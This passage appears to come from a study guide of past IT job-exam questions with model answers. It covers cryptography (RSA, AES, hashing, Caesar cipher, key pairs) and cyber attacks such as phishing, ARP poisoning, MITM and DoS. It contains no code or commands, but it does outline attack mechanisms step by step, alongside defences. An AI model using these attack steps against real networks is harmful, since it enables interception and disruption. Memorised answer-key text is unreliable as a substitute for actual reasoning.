   - Neither is used alone in practice. In TLS, asymmetric cryptography is used at the start of the connection to authenticate the server through its certificate and to agree a session key, and symmetric cryptography, normally AES, is then used for all the actual data, because it is fast enough for a video stream. This is called hybrid encryption, and it takes the key distribution advantage of asymmetric cryptography and the speed advantage of symmetric cryptography.
16. **Identify the type of algorithm? (i) MD5 (ii) AES (iii) RSA (iv) Diffie-Hellman** *[BAPEX Assistant General Manager (ICT) 20.01.2023 compact it 461 (ET: BUET)]*


   Answer:

   | Algorithm | Type | Note |
   |---|---|---|
   | MD5 | Hash function, that is a message digest algorithm | Produces a 128 bit digest; one way, not encryption; cryptographically broken and unsafe for security use |
   | AES | Symmetric key encryption, a block cipher | Advanced Encryption Standard, 128 bit block with 128, 192 or 256 bit keys; the current standard for bulk encryption |
   | RSA | Asymmetric, that is public key, encryption | Used for encryption, digital signatures and key transport; its security rests on the difficulty of factoring a large integer |
   | Diffie-Hellman | Asymmetric key exchange algorithm | It does not encrypt data; it allows two parties to agree a shared secret key over a public channel; its security rests on the discrete logarithm problem |

   - The distinctions the examiner is testing: MD5 is a hash and not an encryption algorithm at all; AES uses one shared key; RSA uses a key pair and can both encrypt and sign; and Diffie-Hellman is only a key agreement protocol, which is why it is always paired with a symmetric cipher afterwards and, without authentication, is vulnerable to a man in the middle attack.
17. **Describe RSA Algorithm and how it works?** *[Teletalk Assistant Manager (IT) 2023 compact it 467 (ET: N/A)]*


   Answer: RSA, named after Rivest, Shamir and Adleman who published it in 1977, is the most widely used asymmetric encryption algorithm. Its security rests on the difficulty of factoring the product of two very large prime numbers.

   Key generation:
   - Step 1: choose two large distinct prime numbers p and q, each typically 1024 bits.
   - Step 2: compute n = p × q. This n is the modulus and its bit length is the key size, normally 2048 or 4096 bits.
   - Step 3: compute Euler's totient, φ(n) = (p − 1)(q − 1).
   - Step 4: choose a public exponent e such that 1 < e < φ(n) and gcd(e, φ(n)) = 1. In practice e = 65537 is almost always used.
   - Step 5: compute the private exponent d as the modular multiplicative inverse of e, that is d × e ≡ 1 (mod φ(n)).
   - Public key = (e, n). Private key = (d, n). The primes p and q are then discarded or protected, since anyone who learns them can compute d.

   Encryption and decryption:
   - Encryption: C = Pᵉ mod n, where P is the plaintext expressed as a number less than n.
   - Decryption: P = C^d mod n.
   - Signing: S = M^d mod n using the private key; verification: M = Sᵉ mod n using the public key.

   Worked example with small numbers:
   - Let p = 7 and q = 11, so n = 77 and φ(n) = 6 × 10 = 60.
   - Choose e = 13, since gcd(13, 60) = 1.
   - Find d such that 13d ≡ 1 (mod 60). d = 37, because 13 × 37 = 481 = 8 × 60 + 1.
   - Public key = (13, 77), private key = (37, 77).
   - Encrypt the plaintext P = 5: C = 5¹³ mod 77 = 26.
   - Decrypt: P = 26³⁷ mod 77 = 5, recovering the original.

   Why it is secure:
   - The public key reveals n and e. To find d an attacker must know φ(n), which requires factoring n back into p and q. Factoring a 2048 bit modulus is beyond any present computing power, and the effort grows sub-exponentially with the key length.

   Practical points:
   - RSA is slow, so it is not used for bulk data. It encrypts a symmetric session key, and AES then encrypts the data. This is the hybrid model used by TLS.
   - Padding is essential: textbook RSA is insecure, and OAEP is used for encryption and PSS for signatures.
   - Minimum key size today is 2048 bits; 1024 is deprecated.
   - ECC gives equivalent security with far shorter keys, so a 256 bit ECC key matches a 3072 bit RSA key, which is why ECC is preferred on mobile and constrained devices.
   - Shor's algorithm on a sufficiently large quantum computer would break RSA, which is why post-quantum algorithms are being standardised now.
18. **অথবা, (ক) Private key এবং Public key উদাহরণসহ ব্যাখ্যা করুন।** *[17th NTRCA Lecturer (ICT) (CSE): 2023 compact it 614 (ET: N/A)]*


   Answer:

   - Public key: one half of a key pair, published openly so that anyone may hold it. It is used to encrypt a message intended for the owner, and to verify a signature made by the owner.
   - Private key: the other half, kept secret by the owner and never shared. It is used to decrypt a message encrypted with the matching public key, and to create a signature.
   - The two are mathematically related, but the private key cannot be derived from the public key in any practical time, because the relationship rests on a hard problem: factoring a very large integer in RSA, or the discrete logarithm on an elliptic curve in ECC.

   The two directions of use:
   - For confidentiality: the sender encrypts with the recipient's public key, and only the recipient's private key can decrypt it. So anyone can send a secret to the owner, and only the owner can read it.
   - For authentication and non-repudiation: the sender signs with the sender's own private key, and anyone can verify with the sender's public key. So only the owner could have produced it, and the owner cannot later deny it.

   Example:
   - Rahim wants to send a confidential message to Karim. He obtains Karim's public key, which is published, and encrypts the message with it. Even Rahim cannot now decrypt it. Karim decrypts it with his private key, which nobody else possesses.
   - If Rahim also wants Karim to be sure the message came from him, he first hashes the message and encrypts the hash with his own private key, producing a digital signature. Karim verifies it with Rahim's public key.
   - The public key is bound to an identity by a digital certificate issued by a Certifying Authority, which is what a Public Key Infrastructure provides. Otherwise an attacker could publish a false public key claiming to be Karim.
19. **(খ) Plaintext ও Cipher text এর পার্থক্য লিখুন।** *[17th NTRCA Lecturer (ICT) (CSE): 2023 compact it 614 (ET: N/A)]*


   Answer:

   | Point | Plaintext | Ciphertext |
   |---|---|---|
   | Meaning | The original readable message before encryption | The unreadable output produced by encryption |
   | Readability | Human readable and understandable | Meaningless without the key |
   | Form | Ordinary text, numbers, images or any data | An apparently random sequence of bytes |
   | Security | Not protected; anyone intercepting it can read it | Protected; interception reveals nothing |
   | How it is obtained | It is the input, or the output of decryption | It is the output of encryption |
   | Key needed | No | The correct key is needed to return it to plaintext |
   | Where it exists | At the sender before encryption and at the receiver after decryption | In transit and in storage |
   | Example | `HELLO` | `KHOOR` with a Caesar shift of 3, or a long random string with AES |

   - The transformation: plaintext + key + encryption algorithm gives ciphertext; ciphertext + key + decryption algorithm returns the plaintext.
   - The purpose of the distinction is confidentiality: data should exist as plaintext only at the two endpoints, and as ciphertext everywhere in between, which is the principle of end to end encryption.
20. **What is SHA-256 and SHA-512 in network security, what is avalanche effect, is it desirable or undesirable.** *[RPGCL Assistant Manager (ICT) 2022 compact it 655 (ET: BUET)]*


   Answer:

   SHA-256 and SHA-512:
   - SHA stands for Secure Hash Algorithm. SHA-256 and SHA-512 belong to the SHA-2 family, designed by the NSA and published by NIST in 2001.
   - SHA-256 produces a 256 bit, that is 64 hexadecimal character, digest, processing the input in 512 bit blocks over 64 rounds using 32 bit words.
   - SHA-512 produces a 512 bit, that is 128 hexadecimal character, digest, processing 1024 bit blocks over 80 rounds using 64 bit words. On a 64 bit processor it is often faster than SHA-256 despite the longer output.
   - Both are one way: the input cannot be recovered from the digest. Both are deterministic, so the same input always gives the same digest, and both are collision resistant, so no two inputs are known to give the same digest.
   - Uses in network security: password storage with a salt, file and message integrity verification, digital signatures and certificates, HMAC for message authentication in TLS and IPsec, blockchain, and code signing.
   - They replaced MD5 and SHA-1, both of which are broken because collisions can be produced in practice.

   The avalanche effect:
   - The avalanche effect is the property that changing a single bit of the input changes about half the bits of the output, apparently at random.
   - Example: SHA-256 of "Hello" and of "hello" differ in a single bit of input, yet the two digests have no visible relation to each other and differ in roughly 128 of their 256 bits.

   Is it desirable:
   - It is highly desirable, and it is a mandatory property of any good hash function or cipher.
   - Reasons:
   - It hides any relationship between the input and the output, so an attacker cannot infer anything about the message from the digest.
   - It prevents an attacker from making a small, controlled change to the input in order to produce a predictable change in the output, which would otherwise allow a document to be altered while keeping its digest.
   - It makes similar inputs produce entirely dissimilar digests, so partial knowledge of the input gives no advantage.
   - It defeats differential cryptanalysis, which works precisely by tracing how input differences propagate to output differences.
   - It ensures the output is uniformly distributed, which is what collision resistance depends on.
   - Claude Shannon identified this as the property of diffusion, and together with confusion it is the design foundation of every modern hash function and block cipher. A function without the avalanche effect is unusable for security.
21. **(ii) Symmetric Key Encryption and Asymmetric Key Encryption ব্যাখ্যা করুন।** *[BPSC Assistant Programmer (Ministry of Commerce) 2021 compact it 790 (ET: N/A)]*


   Answer:

   Symmetric key encryption:
   - A single shared secret key performs both encryption and decryption. Both parties must hold the same key and keep it secret.
   - It is very fast, so it is used for the bulk of the data, but the key must be delivered securely to the other party, and n users require n(n − 1)/2 distinct keys.
   - It provides confidentiality only; it cannot by itself prove who sent a message.
   - Algorithms: AES with 128, 192 or 256 bit keys, DES, 3DES, Blowfish and ChaCha20. Block ciphers such as AES encrypt a fixed size block at a time; stream ciphers encrypt bit by bit.
   - Example: a head office and a branch share an AES-256 key and use it to encrypt the daily transaction file exchanged between them.

   Asymmetric key encryption:
   - A mathematically related key pair is used: a public key which may be published, and a private key which the owner alone holds. What one key encrypts, only the other can decrypt.
   - For confidentiality the sender encrypts with the recipient's public key. For authentication the sender signs with the sender's own private key.
   - It is 100 to 1000 times slower, and it requires much longer keys, but it solves key distribution and provides digital signatures, authentication and non-repudiation.
   - Algorithms: RSA, ECC, Diffie-Hellman, ElGamal, DSA.
   - Example: a browser encrypts a session key with the bank's public key taken from its TLS certificate, and only the bank's private key can recover it.

   Comparison:

   | Point | Symmetric encryption | Asymmetric encryption |
   |---|---|---|
   | Keys | One shared secret key for both encryption and decryption | A key pair: a public key to encrypt and a private key to decrypt |
   | Key distribution | The hard problem: the secret key must reach the other party securely | Solved: the public key may be published freely |
   | Speed | Very fast, suitable for bulk data | 100 to 1000 times slower |
   | Key length | 128 or 256 bits | 2048 or 4096 bits for RSA, 256 bits for ECC |
   | Number of keys for n users | n(n − 1)/2 keys | 2n keys, one pair each |
   | Services provided | Confidentiality | Confidentiality, authentication, non-repudiation and key exchange |
   | Algorithms | AES, DES, 3DES, Blowfish, RC4, ChaCha20 | RSA, Diffie-Hellman, ECC, ElGamal, DSA |
   | Typical use | Encrypting files, disks, databases and the bulk of network traffic | Key exchange, digital signatures and certificates |

   How they are used together, which is the point the examiner looks for:
   - Neither is used alone in practice. In TLS, asymmetric cryptography is used at the start of the connection to authenticate the server through its certificate and to agree a session key, and symmetric cryptography, normally AES, is then used for all the actual data, because it is fast enough for a video stream. This is called hybrid encryption, and it takes the key distribution advantage of asymmetric cryptography and the speed advantage of symmetric cryptography.
22. **(a) What is meant by Encryption and Decryption?** *[BPSC Sub-Assistant Engineer (Ministry of Agriculture) 2021 compact it 796 (ET: N/A)]*


   Answer:

   - Encryption is the process of converting readable data, called plaintext, into an unreadable form, called ciphertext, using an algorithm and a key, so that anyone intercepting it cannot understand it.
   - Decryption is the reverse process: converting the ciphertext back into the original plaintext using the appropriate key.
   - Together they provide confidentiality, which is the assurance that only the intended recipient can read the message.

   Components:
   - Plaintext, the original readable data.
   - Encryption algorithm or cipher, for example AES or RSA.
   - Key, the secret value controlling the transformation. By Kerckhoffs's principle the algorithm is public and the security rests entirely on the key.
   - Ciphertext, the unreadable output.
   - Decryption algorithm, the inverse process.

   Formulas:
   - Encryption: C = E(P, K), that is ciphertext = Encrypt(plaintext, key)
   - Decryption: P = D(C, K), that is plaintext = Decrypt(ciphertext, key)

   Example, Caesar cipher with key 3:
   - `HELLO` encrypts to `KHOOR`, and `KHOOR` decrypts back to `HELLO`.
   - C = (P + 3) mod 26 and P = (C − 3) mod 26.

   Types:
   - Symmetric: the same key for both operations. Fast, used for bulk data. AES, DES, 3DES.
   - Asymmetric: a public key encrypts and a private key decrypts. Slower, but it solves key distribution and enables signatures. RSA, ECC.

   Purpose: confidentiality above all, and with authenticated modes also integrity. It is what makes online banking, e-commerce, VPNs and secure messaging possible.
23. **Difference between private key and public key.** *[BCC CA Monitoring System Project 2021 compact it 829 (ET: N/A)]*


   Answer:

   | Point | Private key | Public key |
   |---|---|---|
   | Secrecy | Kept secret by the owner and never shared | Published openly and given to anyone |
   | Number of holders | One, the owner alone | Any number |
   | Used to | Decrypt a message sent to the owner, and to create a digital signature | Encrypt a message for the owner, and to verify the owner's signature |
   | Cryptography type | Used in both symmetric and asymmetric cryptography; in symmetric cryptography the shared secret key is also called a private key | Used only in asymmetric cryptography |
   | If disclosed | Total compromise; all confidentiality and all signatures are void | No harm; it is meant to be public |
   | Distribution | Never distributed | Distributed freely, usually inside a digital certificate |
   | Storage | In a protected key store, a smart card or a hardware security module | In a certificate published by a Certifying Authority |
   | Derivation | Cannot be derived from the public key in practical time | Derived from the private key during key generation |
   | Provides | Non-repudiation and decryption | Confidentiality and signature verification |

   - The relationship: the two form a mathematically linked pair, and what one encrypts only the other can decrypt. The private key can generate the public key, but not the reverse, because the relationship rests on a hard problem such as integer factorisation or the elliptic curve discrete logarithm.
   - The whole practical value of the arrangement is that a secret can be sent to someone with whom no secret has ever been shared, which symmetric cryptography cannot do.
24. **Write two symmetric key algorithm name.** *[JGTDSL Assistant Engineer (CSE) 08.10.2021 compact it 859 (ET: N/A)]*


   Answer: Two symmetric key algorithms are AES and DES.

   - AES, the Advanced Encryption Standard: a block cipher with a 128 bit block and key lengths of 128, 192 or 256 bits, using 10, 12 or 14 rounds. It was adopted in 2001, is the current worldwide standard, and is used in TLS, VPNs, Wi-Fi WPA2 and WPA3, and disk encryption.
   - DES, the Data Encryption Standard: a Feistel block cipher with a 64 bit block and an effective 56 bit key over 16 rounds, published in 1977. It is now broken, since its key space can be searched exhaustively, and it survives only as 3DES, which applies it three times.
   - Other symmetric algorithms that may be named: 3DES, Blowfish, Twofish, IDEA, RC4 and ChaCha20.
25. **(b) Describe secret key and public key encryption.** *[BPSC (Security Services Division) Assistant Maintenance Engineer 15.12.2021 compact it 896 (ET: N/A)]*


   Answer:

   Secret key encryption, that is symmetric encryption:
   - A single secret key, known to both parties and to nobody else, is used both to encrypt and to decrypt.
   - Process: the sender encrypts the plaintext with the shared key, and the receiver decrypts the ciphertext with the same key.
   - Advantages: very fast, efficient in computation and memory, and therefore suitable for large volumes of data such as file, disk and network traffic encryption.
   - Disadvantages: the key must be delivered to the other party over some secure channel, which is the central difficulty; n users need n(n − 1)/2 keys, so the number of keys grows quadratically; and it provides confidentiality only, with no proof of who sent the message and no non-repudiation.
   - Algorithms: AES, DES, 3DES, Blowfish, ChaCha20.
   - Example: a head office and a branch share an AES-256 key and use it to encrypt the daily data file exchanged between them.

   Public key encryption, that is asymmetric encryption:
   - A related pair of keys is used: a public key that may be published to anyone, and a private key kept secret by its owner. What one key encrypts, only the other can decrypt.
   - For confidentiality: the sender encrypts with the recipient's public key, and only the recipient's private key decrypts it.
   - For authentication and non-repudiation: the sender signs with the sender's private key, and anyone verifies with the sender's public key.
   - Advantages: no secret has to be transported, since the public key is published; only 2n keys are needed for n users; and it provides digital signatures, authentication and non-repudiation, which symmetric cryptography cannot.
   - Disadvantages: 100 to 1000 times slower, needs much longer keys, and requires a Public Key Infrastructure with certificates to bind public keys to real identities, without which it is open to a man in the middle attack.
   - Algorithms: RSA, ECC, Diffie-Hellman, ElGamal.
   - Example: a browser encrypts a session key with a bank's public key taken from its TLS certificate, and only the bank can recover it.

   How they are used together:
   - Neither is used alone in practice. TLS, PGP, SSH and VPNs all use public key cryptography to authenticate and to agree a symmetric session key, and then use symmetric cryptography for the actual data. This hybrid arrangement takes the key distribution advantage of one and the speed of the other.
26. **The Caesar Cipher is a type of shift cipher. Shift Ciphers work by using the modulo operator to encrypt and decrypt messages. The Shift Cipher has a key K, which is an integer from 0 to 25. How to Encrypt, How to decrypt.** *[Janata Bank Ltd SO ( Assistant Network Engineer) 2020 compact it 1009-1010 (ET: N/A)]*


   Answer: The Caesar cipher, or shift cipher, replaces each letter of the alphabet by the letter a fixed number of places further on, wrapping round from Z to A. The key K is an integer from 0 to 25.

   Method:
   - Letters are numbered A = 0, B = 1, C = 2, up to Z = 25.

   How to encrypt:
   - For each letter of the plaintext, convert it to its number P, then compute
   - C = (P + K) mod 26
   - and convert C back to a letter.

   How to decrypt:
   - For each letter of the ciphertext, convert it to its number C, then compute
   - P = (C − K) mod 26
   - and convert P back to a letter. Adding 26 before taking the modulus avoids a negative value.

   Worked example with K = 3, encrypting `HELLO`:

   | Letter | P | (P + 3) mod 26 | Cipher letter |
   |---|---|---|---|
   | H | 7 | 10 | K |
   | E | 4 | 7 | H |
   | L | 11 | 14 | O |
   | L | 11 | 14 | O |
   | O | 14 | 17 | R |

   - Ciphertext: `KHOOR`

   Decrypting `KHOOR` with K = 3:

   | Letter | C | (C − 3) mod 26 | Plain letter |
   |---|---|---|---|
   | K | 10 | 7 | H |
   | H | 7 | 4 | E |
   | O | 14 | 11 | L |
   | O | 14 | 11 | L |
   | R | 17 | 14 | O |

   - Plaintext recovered: `HELLO`

   Wrap-around example: with K = 3, `Z` has P = 25, so C = (25 + 3) mod 26 = 2, which is `C`.

   Security:
   - The key space is only 26, and one of those is the useless K = 0, so brute force takes at most 25 attempts. It is also trivially broken by frequency analysis, since the letter distribution of the plaintext is preserved exactly.
   - It is therefore of historical and educational value only. It is a monoalphabetic substitution cipher; the Vigenère cipher improves on it by using a different shift for each position, and modern ciphers such as AES replace the idea entirely.
27. **Public key cryptography কীভাবে কাজ করে?** *[BPSC Assistant Maintenance Engineer (CSE) 2020 compact it 1020 (ET: N/A)]*


   Answer: Public key cryptography works with a mathematically related pair of keys instead of a single shared secret.

   - Public key: one half of a key pair, published openly so that anyone may hold it. It is used to encrypt a message intended for the owner, and to verify a signature made by the owner.
   - Private key: the other half, kept secret by the owner and never shared. It is used to decrypt a message encrypted with the matching public key, and to create a signature.
   - The two are mathematically related, but the private key cannot be derived from the public key in any practical time, because the relationship rests on a hard problem: factoring a very large integer in RSA, or the discrete logarithm on an elliptic curve in ECC.

   The two directions of use:
   - For confidentiality: the sender encrypts with the recipient's public key, and only the recipient's private key can decrypt it. So anyone can send a secret to the owner, and only the owner can read it.
   - For authentication and non-repudiation: the sender signs with the sender's own private key, and anyone can verify with the sender's public key. So only the owner could have produced it, and the owner cannot later deny it.

   Example:
   - Rahim wants to send a confidential message to Karim. He obtains Karim's public key, which is published, and encrypts the message with it. Even Rahim cannot now decrypt it. Karim decrypts it with his private key, which nobody else possesses.
   - If Rahim also wants Karim to be sure the message came from him, he first hashes the message and encrypts the hash with his own private key, producing a digital signature. Karim verifies it with Rahim's public key.
   - The public key is bound to an identity by a digital certificate issued by a Certifying Authority, which is what a Public Key Infrastructure provides. Otherwise an attacker could publish a false public key claiming to be Karim.

   The complete process for a secure message:
   - Step 1: the recipient generates a key pair and publishes the public key, normally inside a digital certificate issued by a Certifying Authority.
   - Step 2: the sender obtains that certificate and verifies it, which confirms that the public key really belongs to the intended recipient.
   - Step 3: because asymmetric encryption is slow, the sender generates a random symmetric session key, encrypts the actual message with it using AES, and encrypts only that short session key with the recipient's public key.
   - Step 4: the sender hashes the message and encrypts the hash with the sender's own private key, producing a digital signature.
   - Step 5: the encrypted message, the encrypted session key and the signature are sent.
   - Step 6: the recipient decrypts the session key with the private key, decrypts the message with the session key, and verifies the signature with the sender's public key.
   - The result is confidentiality, integrity, authentication and non-repudiation together, which is exactly what TLS, PGP and S/MIME provide.

   Mathematical basis: RSA rests on the difficulty of factoring the product of two large primes; Diffie-Hellman and ECC rest on the discrete logarithm problem. In each case the operation is easy to perform in one direction and computationally infeasible to reverse.

   Applications: HTTPS and TLS, digital signatures and certificates, SSH, VPNs, secure email, cryptocurrency wallets, and code signing.

## Social Engineering & Cyber Attacks (26)

1. What is a phishing attack? Explain its types and discuss methods to prevent it. *[Combined Bank Officer (IT) 09.05.2026 debug it (ET: N/A)]*


   Answer:

   - Phishing is a social engineering attack in which the attacker sends a fraudulent message that appears to come from a trusted source, in order to trick the recipient into revealing credentials or financial information, or into opening a malicious attachment or link.
   - It attacks the human being rather than the technology, which is why it defeats organisations with strong technical defences. It is the starting point of the great majority of successful breaches.

   Types of phishing:
   - Email phishing: mass emails imitating a bank, a courier or a service provider, with a link to a counterfeit login page.
   - Spear phishing: targeted at one named individual, using personal details gathered beforehand, which makes it far more convincing.
   - Whaling: spear phishing aimed at a senior executive, since their access is the most valuable.
   - Vishing: voice phishing by telephone, for example a caller claiming to be from the bank's card division asking for an OTP.
   - Smishing: phishing by SMS, very common in Bangladesh with fake mobile financial service messages.
   - Clone phishing: a genuine email that the victim has already received is copied, with the attachment or link replaced.
   - Business Email Compromise: impersonating a chief executive or a supplier to instruct a fraudulent payment.
   - Pharming: redirecting the victim to a counterfeit site by poisoning DNS or the hosts file, without any deceptive message at all.
   - Angler phishing on social media, and QR code phishing.

   Prevention:
   - User awareness training and regular simulated phishing exercises, since the user is the control that actually decides the outcome.
   - Email security: SPF, DKIM and DMARC to stop domain spoofing; anti-spam and attachment sandboxing; and warning banners on external mail.
   - Multi-factor authentication, so a stolen password alone is not enough. Phishing resistant factors such as FIDO2 security keys defeat even a real time proxy attack.
   - Verify independently: never use a link or a telephone number contained in the message; go to the site or ring the number from the official source.
   - Technical controls: URL filtering, DNS filtering, browser anti-phishing, and blocking macros in documents from the Internet.
   - Procedural controls: dual authorisation and call-back verification for any payment or change of bank details.
   - Prompt patching, least privilege, and monitoring for credential use from unusual locations.
   - A no-blame reporting culture, so that a user who clicks reports it immediately rather than concealing it.
2. **(b) What is an ARP poisoning attack, and how does it work?** *[NPCBL Sub Assistant Engineer: Cyber Security Analyst Date: 11 July 2026 (ET: N/A)]*


   Answer: ARP poisoning, also called ARP spoofing or ARP cache poisoning, is an attack in which the attacker sends forged ARP messages onto a local network so that his own MAC address becomes associated with the IP address of another host, typically the default gateway.

   - ARP has no authentication at all. A host accepts any ARP reply it receives and updates its cache accordingly, even if it never sent a request. This is the flaw the attack exploits.

   How it works:
   - Step 1: the attacker connects to the same LAN segment as the victim.
   - Step 2: the attacker sends a forged ARP reply to the victim saying "the gateway's IP address is at my MAC address".
   - Step 3: the attacker sends another forged ARP reply to the gateway saying "the victim's IP address is at my MAC address".
   - Step 4: both update their ARP caches. From that moment every packet between the victim and the gateway passes through the attacker's machine.
   - Step 5: the attacker enables IP forwarding so the traffic still reaches its destination and nothing appears wrong, while he reads, records or alters it. This is a Man in the Middle position.
   - The forged replies are sent repeatedly, so that the poisoned entry is refreshed before the legitimate one can replace it.

   ```
   Normal:    Victim <---------------> Gateway <---> Internet

   Poisoned:  Victim <---> Attacker <---> Gateway <---> Internet
              (victim believes the attacker is the gateway,
               and the gateway believes the attacker is the victim)
   ```

   What the attacker can then do: capture credentials sent over unencrypted protocols, hijack sessions by stealing cookies, perform SSL stripping to downgrade HTTPS, inject content into pages, or simply drop the traffic to cause a denial of service.

   Prevention:
   - Dynamic ARP Inspection on managed switches, which validates every ARP packet against the DHCP snooping binding table and drops forged ones. This is the primary defence.
   - DHCP snooping, which builds that trusted table of IP to MAC to port bindings.
   - Port security, limiting the number of MAC addresses learned on a port.
   - Static ARP entries for critical hosts such as the gateway and servers, though this does not scale.
   - Encryption everywhere: HTTPS, SSH and VPN, so that even a successful interception yields nothing readable.
   - Network segmentation with VLANs, which limits how far an attacker can reach.
   - ARP monitoring tools such as arpwatch, which alert when an IP to MAC mapping changes unexpectedly.
   - 802.1X port based authentication, so that an unauthorised device cannot join the LAN at all.
3. **What is a Man-in-the-Middle (MITM) attack? Describe two countermeasures to prevent it.** *[NPCBL Sub Assistant Engineer: Cyber Security Analyst Date: 11 July 2026 (ET: N/A)]*


   Answer:

   - A Man in the Middle attack is one in which the attacker secretly places himself between two communicating parties, so that all traffic passes through him. Each party believes it is talking directly to the other, while the attacker can read, record and alter everything.
   - It breaks confidentiality, integrity and authentication at once.

   How it is carried out:
   - ARP spoofing on a LAN: the attacker sends forged ARP replies so that the victim maps the gateway's IP to the attacker's MAC address, and the gateway maps the victim's IP to the attacker's MAC. All traffic then flows through the attacker.
   - DNS spoofing or cache poisoning: the attacker supplies a false IP address for a domain, so the victim connects to the attacker's server believing it to be the real one.
   - Rogue access point or evil twin: a fake Wi-Fi hotspot with a familiar name, to which victims connect voluntarily.
   - SSL stripping: the attacker downgrades an HTTPS connection to HTTP so the traffic is readable.
   - Session hijacking: stealing a session cookie and impersonating the authenticated user.
   - BGP hijacking and rogue DHCP servers, which redirect traffic at the network level.

   Countermeasures:
   - Strong encryption in transit: HTTPS with TLS 1.2 or 1.3 everywhere, so that even if the traffic is intercepted it cannot be read or altered. This is the single most effective measure.
   - Certificate validation and HSTS: the browser must verify the server's certificate against a trusted Certifying Authority, and HTTP Strict Transport Security prevents a downgrade to plain HTTP. Certificate pinning goes further by accepting only one specific certificate.
   - Mutual authentication: both sides prove their identity, as in mutual TLS and in IPsec with certificates, so an attacker cannot impersonate either end.
   - Dynamic ARP Inspection and DHCP snooping on switches, which block forged ARP and DHCP messages on the LAN, and port security to limit MAC addresses per port.
   - DNSSEC, which cryptographically signs DNS records so a forged answer is rejected.
   - VPN for any use of an untrusted network, so the whole session is encrypted end to end.
   - Multi-factor authentication, so that a stolen password alone is useless.
   - Avoiding open public Wi-Fi, and user awareness of certificate warnings, which should never be clicked through.

   - Two countermeasures if only two are asked: first, end to end encryption with TLS together with strict certificate validation and HSTS, which makes intercepted traffic useless and prevents impersonation; and second, Dynamic ARP Inspection with DHCP snooping on the switches, which prevents the attacker from obtaining the middle position on the LAN in the first place.
4. **What is a DoS attack? Explain the mechanism of a DDoS attack and how it differs from a simple DoS attack.** *[NPCBL Sub Assistant Engineer: Cyber Security Analyst Date: 11 July 2026 (ET: N/A)]*


   Answer:

   - A Denial of Service attack aims to make a service unavailable to its legitimate users, by exhausting some finite resource: bandwidth, connection table entries, CPU, memory or application threads. It does not steal data; it destroys availability, which is one third of the CIA triad.
   - A Distributed Denial of Service attack is the same thing launched simultaneously from many compromised machines, called a botnet, which may number in the hundreds of thousands and be spread across the world.

   | Point | DoS | DDoS |
   |---|---|---|
   | Source | A single machine and a single IP address | Thousands of machines and IP addresses |
   | Traffic volume | Limited by the attacker's own connection | Can reach terabits per second |
   | Detection | Comparatively easy; the pattern comes from one source | Very difficult; each source looks like an ordinary user |
   | Mitigation | Block the offending IP address | Blocking individual addresses is useless; scrubbing services and rate limiting are required |
   | Tracing the attacker | Possible | Very hard, since the real attacker only commands the botnet |
   | Impact | Moderate | Severe; it can remove a large service entirely |

   Types of attack:
   - Volumetric: UDP flood, ICMP flood and amplification attacks using DNS, NTP or memcached, in which a small forged request produces a very large reply directed at the victim.
   - Protocol attacks: SYN flood, which fills the connection table with half open connections; ping of death; Smurf attack.
   - Application layer attacks: HTTP flood, Slowloris, which holds connections open with partial requests, and expensive database queries repeated endlessly. These use very little bandwidth and are the hardest to detect.

   Mitigation:
   - Rate limiting and connection limits, SYN cookies, and traffic filtering at the edge.
   - A Web Application Firewall and an Intrusion Prevention System.
   - A DDoS scrubbing service or CDN such as Cloudflare or Akamai, which absorbs and filters the traffic before it reaches the origin.
   - Anycast, which spreads the traffic across many sites.
   - Over-provisioned bandwidth, autoscaling and load balancing.
   - Blackhole and sinkhole routing, and coordination with the upstream ISP, which is essential because a volumetric attack must be stopped upstream of the victim's own link.
   - Monitoring with alert thresholds and a rehearsed incident response plan.
5. **What is a Man-inThe Middle (MitM) attack? How can it be prevented?** *[BPSC (Ministry of Food) Network/Website Manager (CSE) 21.05.2025 compact it 1337 (ET: N/A)]*


   Answer:

   - A Man in the Middle attack is one in which the attacker secretly places himself between two communicating parties, so that all traffic passes through him. Each party believes it is talking directly to the other, while the attacker can read, record and alter everything.
   - It breaks confidentiality, integrity and authentication at once.

   How it is carried out:
   - ARP spoofing on a LAN: the attacker sends forged ARP replies so that the victim maps the gateway's IP to the attacker's MAC address, and the gateway maps the victim's IP to the attacker's MAC. All traffic then flows through the attacker.
   - DNS spoofing or cache poisoning: the attacker supplies a false IP address for a domain, so the victim connects to the attacker's server believing it to be the real one.
   - Rogue access point or evil twin: a fake Wi-Fi hotspot with a familiar name, to which victims connect voluntarily.
   - SSL stripping: the attacker downgrades an HTTPS connection to HTTP so the traffic is readable.
   - Session hijacking: stealing a session cookie and impersonating the authenticated user.
   - BGP hijacking and rogue DHCP servers, which redirect traffic at the network level.

   Countermeasures:
   - Strong encryption in transit: HTTPS with TLS 1.2 or 1.3 everywhere, so that even if the traffic is intercepted it cannot be read or altered. This is the single most effective measure.
   - Certificate validation and HSTS: the browser must verify the server's certificate against a trusted Certifying Authority, and HTTP Strict Transport Security prevents a downgrade to plain HTTP. Certificate pinning goes further by accepting only one specific certificate.
   - Mutual authentication: both sides prove their identity, as in mutual TLS and in IPsec with certificates, so an attacker cannot impersonate either end.
   - Dynamic ARP Inspection and DHCP snooping on switches, which block forged ARP and DHCP messages on the LAN, and port security to limit MAC addresses per port.
   - DNSSEC, which cryptographically signs DNS records so a forged answer is rejected.
   - VPN for any use of an untrusted network, so the whole session is encrypted end to end.
   - Multi-factor authentication, so that a stolen password alone is useless.
   - Avoiding open public Wi-Fi, and user awareness of certificate warnings, which should never be clicked through.
6. **Briefly explain phishing attack and denial-of-service (DoS) attack.** *[BPSC (Ministry of Food) Network/Website Manager (CSE) 21.05.2025 compact it 1341 (ET: N/A)]*


   Answer:

   Phishing attack:
   - Phishing is a social engineering attack in which a fraudulent message, appearing to come from a trusted source such as a bank or a service provider, tricks the recipient into revealing credentials or financial details, or into opening a malicious link or attachment.
   - Mechanism: the attacker registers a similar looking domain, copies the genuine login page, sends the message with an urgent pretext such as "your account will be suspended", and captures whatever the victim types into the counterfeit page.
   - Variants: spear phishing at a named individual, whaling at an executive, vishing by telephone, smishing by SMS, and business email compromise instructing a fraudulent payment.
   - Damage: stolen credentials and money, malware installed, and a foothold from which a much larger breach follows.
   - Prevention: user awareness and simulated phishing exercises, SPF, DKIM and DMARC, multi-factor authentication, URL and DNS filtering, verification of any payment instruction by an independent channel, and a no-blame reporting culture.

   Denial of Service attack:
   - A DoS attack aims to make a service unavailable to its legitimate users by exhausting a finite resource: bandwidth, connection table entries, CPU, memory or application threads. It attacks availability rather than confidentiality.
   - Mechanism: the attacker sends far more requests than the service can handle, or sends specially crafted requests that consume a disproportionate amount of resource. A SYN flood fills the connection table with half open connections; Slowloris holds connections open with deliberately incomplete requests; an amplification attack sends a small forged request to a DNS or NTP server so that a very large reply is directed at the victim.
